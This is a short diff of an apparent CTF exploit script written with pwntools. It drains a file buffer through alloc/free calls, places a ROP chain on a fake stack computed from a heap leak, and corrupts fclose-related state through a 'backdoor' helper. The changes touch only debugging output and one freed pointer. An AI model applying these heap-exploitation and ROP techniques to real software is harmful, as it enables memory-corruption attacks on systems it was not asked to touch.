@@ -166,11 +166,11 @@ def main(nstep = 1):
     info(f'we read {nread:#x} bytes, remaining {nremains:#x} bytes')
 
     n = accounts[-1]
-    with log.progress('draining fp_rand->buffer'), context.silent:
+    with log.progress('draining fp_rand->buffer'):#, context.silent:
         for i in range(nremains // 29):
             free(n)
             n = alloc()
-
+        pass
 
     nremains %= 29
     info(f'\tremaining {nremains:#x} bytes')
@@ -182,11 +182,11 @@ def main(nstep = 1):
         0x900: bytes(rop)
     }, filler=b'8').ljust(0x1000, b'8')
 
-    free(n)
+    free(accounts[0])
     n = alloc(msg)
     fp_rand_read_base = heap_leak - 0x1550 # fp_rand->buffer
     fake_stack = fp_rand_read_base + 0x900
-    info('remember to restore fd to be used in fclose(fp_rand)')
+    info('restore fd=3 to not close(stdin) accidentally')
     backdoor(fake_stack - 8, fclose_rbp_ptr, fp_rand_lock_addr, 3)
     # gdb_pause()
     cmd(7)
